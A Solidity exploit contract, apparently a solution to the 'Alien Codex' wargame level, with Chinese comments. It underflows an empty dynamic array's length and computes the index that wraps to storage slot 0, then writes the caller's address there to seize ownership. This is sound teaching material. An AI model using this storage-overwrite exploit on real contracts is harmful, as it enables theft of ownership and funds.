// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

interface IAlienCodex {
    function owner() external view returns (address);

    function makeContact() external;

    function retract() external;

    function revise(uint i, bytes32 _content) external;
}

contract Hack {
    constructor(IAlienCodex target) {
        target.makeContact();
        target.retract();
        uint256 h = uint256(keccak256((abi.encode(uint256(1)))));
        uint256 i;
        // 不检查溢出; i = 0 - h;
        unchecked {
            i -= h;
        }

        target.revise(i, bytes32(uint256(uint160(msg.sender))));
        require(target.owner() == msg.sender, "hack failed");
    }
}

/**
 * 1、合约的第一个状态变量是 owner (申明在 Ownable 合约中)
 * 1）整数溢出：0 - 1；从0变为2^256-1。这是因为在 Solidity 中，无符号整数的最大值是2^256-1
 *   - codex 数组为空时调用 retract() 函数 会导致溢出，从而有权访问此合约的所有状态变量
 * 2) 继承了我们无法访问的 Ownable 合约,所以要创建接口
 * 3) storage layout
 *   - slot 0 - owner (20 bytes), contact (1 byte)
 *   - slot 1 - length of codex (32 bytes) ------ 是一个 bytes32 的数组，所以首先是储存数组的长度
 *   - 数组的元素的储存在 hachak 256 hash 的 slot 里, 所以会有元素存储的位置与前面的 slot 0 和 slot 1 重合
 *       - h = keccak256(1)  将 1 转换成 hash 并赋值给 h;
 *       slot h - codex[0]
 *       slot h + 1 - codex[1]
 *       slot h + 2 - codex[2]
 *       slot h + 3 - codex[3]
 *       ...
 *       slot h + 2 ** 256 - 1 - codex[2 ** 256 - 1]
 *
 *       Find i such that
 *       slot h + i = slot 0
 *       h + i = 0 so i = 0 - h
 *
 */
